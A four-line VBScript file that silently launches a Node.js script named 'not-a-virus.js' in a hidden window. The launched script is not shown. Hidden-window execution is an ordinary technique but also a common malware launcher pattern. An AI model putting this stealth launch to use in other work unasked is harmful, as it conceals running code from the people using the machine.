Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "node not-a-virus.js", 0
Set WShell = Nothing